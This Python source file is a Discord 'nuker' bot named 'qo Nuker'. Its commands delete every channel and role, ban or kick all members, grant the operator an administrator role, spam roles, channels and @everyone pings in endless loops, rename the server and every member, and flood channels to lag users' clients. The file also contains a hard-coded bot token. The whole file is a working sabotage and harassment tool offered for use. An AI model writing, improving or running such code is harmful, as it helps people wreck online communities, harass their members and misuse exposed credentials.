
from discord import Permissions
import discord,random,time
import json
from discord.ext import commands, tasks
import os 
import colorama
import asyncio
from colorama import Fore
from discord import Embed
colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="?",intents=intents)
bot.remove_command("help")

@bot.event
async def on_ready():
    print(f'''
{Fore.LIGHTCYAN_EX}╔╗╔┬ ┬┬┌─┌─┐┬─┐        
{Fore.LIGHTCYAN_EX}║║║│ │├┴┐├┤ ├┬┘        
{Fore.LIGHTCYAN_EX}╝╚╝└─┘┴ ┴└─┘┴└─     
Logged in and Ready <3                             
''')

@bot.command()
async def D(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
      if channel.id != 834134636678479902:
        await channel.delete()
      else:
        continue
    guild = ctx.message.guild
    await guild.create_text_channel("nuked")
    print("Nuked All Channels")
    return
  else:
    try:
      channel = ctx.get.channel(id=channel_id)
      await channel.delete()
    except:
      e2 = discord.Embed(title = "Invaild Channel ID.", color = 0x000000)
      await ctx.send(embed=e2)
    return

@bot.command(pass_context=True)
async def AD(ctx):
    try:
        guild = ctx.guild
        role = await guild.create_role(name="qo Nuker", permissions=discord.Permissions(8),colour=discord.Colour(000000))
        authour = ctx.message.author
        await ctx.message.delete()
        await authour.add_roles(role)
        print("Gave you admin <3")
    except:
        print("Couldnt give you admin :(")

@bot.command()
async def RS(ctx):
 while True:
   await ctx.guild.create_role(name="qo NUKER RUNS YOU")
   print("Spamming roles <3")
@bot.command()
async def TRS(ctx):
 while True:
   await ctx.guild.create_role(name="qo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_role(name="qo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="qo NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_role(name="qo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="qo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
   print("Spamming roles <3")
@bot.command()
async def RD(ctx):
  total_roles = ""
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass 
  embed = Embed(title="Done Deleting All Roles", color=0x000000)
  await ctx.send(embed=embed)
  await ctx.message.delete()


@bot.command()
async def CS(ctx,times_reapet=10,name_of_channel="default"):
  for times in range(times_reapet):
    guild = ctx.message.guild
    await guild.create_text_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
  print(f"Spammed {times_reapet} Channels <3")
  await ctx.message.delete()
  await ctx.send(embed=em3)

@bot.command()
async def VS(ctx,times_reapet=10,name_of_channel="default"):
  for times in range(times_reapet):
    guild = ctx.message.guild
    await guild.create_voice_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of voice channels named ***{name_of_channel}***", color = 0xaf1aff)
  print(f"Spammed {times_reapet} Voice Channels <3")
  await ctx.message.delete()
  await ctx.send(embed=em3)

@bot.command()
async def BA(ctx):
 embed=discord.Embed(title="Done Banning All Members", color=0x000000)
 await ctx.send(embed=embed)
 await ctx.message.delete()
 print("Banned All Members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.ban()
        except:
           pass
@bot.command()
async def KA(ctx):
 embed=discord.Embed(title="Done Banning All Members", color=0x000000)
 await ctx.send(embed=embed)
 await ctx.message.delete()
 print("Kicked all members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.kick()
        except:
           pass

@bot.command()
async def help(ctx):
 embed1 = Embed(title="qo Nuker Help", color=0x000000)
 embed1.add_field(name="?help ", value="Sends This Message", inline=False)
 embed1.add_field(name="?CS [Amount] Channel Name", value="Spams Channels", inline=True)
 embed1.add_field(name="?DA", value="Nukes All Channels", inline=False)
 embed1.add_field(name="?BA", value="Bans all members", inline=False)
 embed1.add_field(name="?PS", value="Locks all channels And Spam Pings", inline=False) 
 embed1.add_field(name="?AD", value="Gives user Admin.", inline=False)
 embed1.add_field(name="?VS [Amount] [Channel Name]", value="Spams Voice Channels", inline=False)  
 embed1.add_field(name="?servername [Name]", value="Changes Server Name", inline=False)
 embed1.add_field(name="?nickall [Name]", value="Changes Everyones Names", inline=False)
 embed1.add_field(name="?RS", value="Spams Roles", inline=False)
 embed1.add_field(name="?RD", value="Deletes All Roles Below the Bot", inline=False)
 embed1.add_field(name="?KA", value="Kicks All", inline=False)
 embed1.add_field(name="?TRS", value="spams roles like the trans flag :flusuhed:", inline=False)
 embed1.add_field(name="?LS", value="Lags Peoples Discords", inline=False)
 embed1.set_image(url="https://cdn.discordapp.com/attachments/886865266707955755/886869448508735508/image0.gif")     
 embed1.set_footer(text="By qo#1111")
 embed2 = await ctx.send(embed=embed1)
 time.sleep(10)
 await embed2.delete()
 await ctx.message.delete()


@bot.command()
async def PS(ctx):
    guild = ctx.message.guild
    await ctx.guild.edit(name="qo run'd u lol")
    print("i did the funi")
    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
    lattersL = latters.split()
    while True:
      for time in range(random.randint(4,10)):
        r1 = random.choice(lattersL)
      try:
        await guild.create_text_channel("qo just nuked u")
      except:
        pass 
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
          await channel.send(f"@everyone QO ON TOP                   ")
          await ctx.channel.create_webhook(name="wizzed by tool")
          await channel.send(f"@everyone QO ON TOP            ")
          await ctx.channel.create_webhook(name="wizzed")
          await channel.send(f"@everyone QO ON TOP                            ")
          await ctx.channel.create_webhook(name="wizzed by tool")
          await channel.send(f"@everyone QO ON TOP             ")
          await ctx.channel.create_webhook(name="wizzed")
          await channel.send(f"@everyone QO ON TOP")
          await webhook.send()
        except:
          pass 
@bot.command()
async def LS(ctx):
  while True:
    for channel in ctx.guild.text_channels:
      await channel.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
      print("killing Channels")
@bot.command()
async def servername(ctx, name = None): 
  if name != None:
    await ctx.guild.edit(name=f"{name}")
    print("Changed Server Name")
    em200 = Embed(color = 0x000000, title=f"Changed the server name to: ***{ctx.guild.name}***")
    em2001 = await ctx.send(embed=em200) 
    time.sleep(8)
    await em2001.delete()
  else:  
    em100 = Embed(color = 0x000000, title=ctx.guild.name)
    em1001 = await ctx.send(embed=em100)
    time.sleep(8)
    await em1001.delete()
@bot.command()
async def nickall(ctx, *, name="qo runned you"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 

bot.run("ODg2ODcwNzA2NDcyNzU5MzM2.YT74tQ.SAsSRyxvKSakKbZ_8YlAAUK55Bs")
